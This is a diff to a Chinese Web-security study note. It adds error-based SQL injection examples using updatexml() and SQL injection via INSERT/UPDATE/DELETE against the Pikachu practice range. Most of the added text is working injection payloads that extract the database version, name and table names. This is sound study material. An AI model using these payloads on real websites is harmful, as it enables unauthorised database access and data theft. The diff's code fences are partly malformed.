@@ -28,7 +28,7 @@
         - [案例1-基于union的信息获取](#%E6%A1%88%E4%BE%8B1-%E5%9F%BA%E4%BA%8Eunion%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96)
         - [mysql相关知识](#mysql%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86)
         - [案例2-基于information_schema的信息获取](#%E6%A1%88%E4%BE%8B2-%E5%9F%BA%E4%BA%8Einformation_schema%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96)
-    - [相关链接](#%E7%9B%B8%E5%85%B3%E9%93%BE%E6%8E%A5)
+        - [案例3-基于函数报错的信息获取](#%E6%A1%88%E4%BE%8B3-%E5%9F%BA%E4%BA%8E%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96)
 
 <!-- /TOC -->
 # Web安全
@@ -398,8 +398,39 @@ kobe' union select username,password from users#
 
 ```
 
+### 案例3-基于函数报错的信息获取
+背景条件：后台没有屏蔽数据库报错信息或者做标准化处理，在语法发生错误时会输出在前端
+- updatexml(xml_document,XpathString,new_value): 是MySQL对XML文档数据进行查询和修改的XPATH函数,XpathString必须是有效的，否则报错
+- extractvalue(): 是MySQL对XML文档数据进行查询的XPATH函数
+- floor(): MySQL中用来取整的函数
+
+```sql
+--第一步，先检查有没有报错信息返回
+--第二部，构造payload
+kobe' and updatexml(1,version(),0)# --输出version信息不完整
+kobe' and updatexml(1,concat(0x7e,version()),0)# --0x7e是~的16进制
+kobe' and updatexml(1,concat(0x7e,database()),0)#
+
+--使用上次使用schema的select语句，替换version()
+kobe' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = 'pikachu')),0)# --Operand should contain 1 column(s)
+--使用这种方式，可以和之前一样，一个一个的拿到表，拿到字段，拿到信息
+kobe' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = 'pikachu' limit 0,1)),0)# --XPATH syntax error: '~httpinfo',limit 0/1/2/3/4/5 1
+
+### 案例4-基于insert、update、delete的注入
+```sql
+--正常语句
+insert into users(username,password,id) values('xiaoming',123456,001);
+--使用 ' or …… or ' 拼接
+insert into users(username,password,id) values('xiaoming' or updatexml(1,concat(0x7e,version()),0) or '',123456,001);
+--payload
+xiaoming' or updatexml(1,concat(0x7e,version()),0) or '
+
+
+```
 
 
 
+
+```
 ## 相关链接
 [视频教程](https://www.ichunqiu.com/course/63838)[|靶场](https://github.com/zhuifengshaonianhanlu/pikachu)
